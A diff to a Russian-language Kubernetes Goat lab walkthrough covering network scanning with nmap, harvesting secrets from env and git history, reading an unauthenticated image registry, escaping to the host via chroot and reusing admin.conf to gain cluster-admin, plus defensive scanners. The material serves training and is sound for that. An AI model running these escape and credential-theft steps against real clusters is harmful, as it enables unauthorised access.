@@ -50,7 +50,7 @@ bash ./access-kubernetes-goat.sh
 ```bash
 kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
 ip a
-nmap -p 6379 10.244.0.0/24 #Сеть может быть другой
+nmap -p 6379 10.244.0.0/24 | grep open -B 4 #Сеть может быть другой
 ```
 
 Мы видим открытый Redis:
@@ -125,11 +125,18 @@ spec:
 EOF
 ```
 ## Враг внутри (K02: Supply Chain Vulnerabilities)
+Просканируем всю сеть
+```bash
+nmap 10.244.0.0/24 | grep open -B 4
+```
+На самом деле не обязательно сканировать, kubernetes вежливо всё собирает для нас сам. Давайте выполним команду env.
+```bash
+env
+```
 
-На самом деле не обязательно идти за пределы неймспейса, чтобы получить информацию. Давайте выполним команду env.
 Мы видим вывод в переменную адресов многих сервисов, давайте попробуем зайти на следующий:
 ```bash
-curl http://10.96.140.16:3000
+curl http://10.244.0.7:3000
 ```
 Похоже на сайт с кодом.
 Не будем погружаться в особенности фазинга сайтов через тотже owasp zap (можете сделать это локально дома), но попробуем найти конфиг репозитория по пути:
@@ -147,7 +154,7 @@ trufflehog code-app/
 
 Заботливо подготовленный заранее trufflehog нашёл ключ, но можно достичь этого и просто через git log, git show d7c173ad183c574109cd5c4c648ffe551755b576
 
-## Ну поправили это, а что ещё? (K02: Supply Chain Vulnerabilities, CICD-SEC-6/2)
+## Ну поправили это, а что ещё? (K02: Supply Chain Vulnerabilities, CICD-SEC-7)
 
 У нас в nmap было не только уязвимое веб приложение был ещё порт 5000. Что там?
 ```bash
@@ -163,9 +170,19 @@ curl http://10.244.0.12:5000/v2/madhuakula/k8s-goat-users-repo/manifests/latest
 grep -i key и мы видим GPG ключ и токен-флаг.
 
 Почему так? По умолчанию в registry v2 не реализована аутентификация. В конфиге можно включить Basic и Token (jwt). Можно реализовать самому, а можно взять Jfrog, Nexus, Gitlab, Harbor.
+
+А как с этим бороться?
+Hadolint - https://github.com/hadolint/hadolint
+Checkov - https://github.com/bridgecrewio/checkov
+trivy - https://github.com/aquasecurity/trivy
+
 ## Убегаем (K01: Insecure Workload Configurations, K03: Overly Permissive RBAC Configurations)
 
 Давайте посмотрим, что ещё есть интересного.
+Снова сделаем env и найдём контейнер system-monitor
+```
+env
+```
 
 ```bash
 curl http://10.244.0.7:8080
@@ -186,12 +203,11 @@ chroot /host-system bash
 
 #Если не получится со стандартным кубконфигом
 cp /etc/kuberntetes/admin.conf /root/.kube/config
-sed -i 's/kind-control-plane:6443/10.96.0.1:443/g' /root/.kube/config
 ```
 
-Пробуем получить доступ к кластеру Kubernetes:
+Или пробуем получить доступ к кластеру Kubernetes:
 ```bash
-kubectl auth whoami
+kubectl --kubeconfig=/etc/kubernetes/admin.conf auth whoami
 ```
 
 Видим, что мы админы. На этом всё.
@@ -199,14 +215,18 @@ kubectl auth whoami
 ## Огласите весь список пожалуйста
 Раз уж мы получили доступ к админ токену, то почему бы нам не посмотреть список всех уязвимостей в кластере.
 Сохраним конфиг админа из /etc/kuberntetes/admin.conf ну или нет, т.к это тот же конфиг, что и у нас на ноде =)
-Установим trivy.
+Для выполнения можно выйти из контейнера и провести операцию прямо на вашем ноутбуке.
+
+Установим checkov.
 ```bash
-https://trivy.dev/latest/getting-started/installation/
+https://github.com/bridgecrewio/checkov?tab=readme-ov-file#installation
 ```
+
 И запустим
 ```bash
-trivy k8s --report summary
+git clone https://github.com/bridgecrewio/checkov.git
+cd checkov/kubernetes
+mkdir data
+bash ./run_checkov.sh
 ```
-export KUBECONFIG=config
-trivy k8s --report summary
-```
+
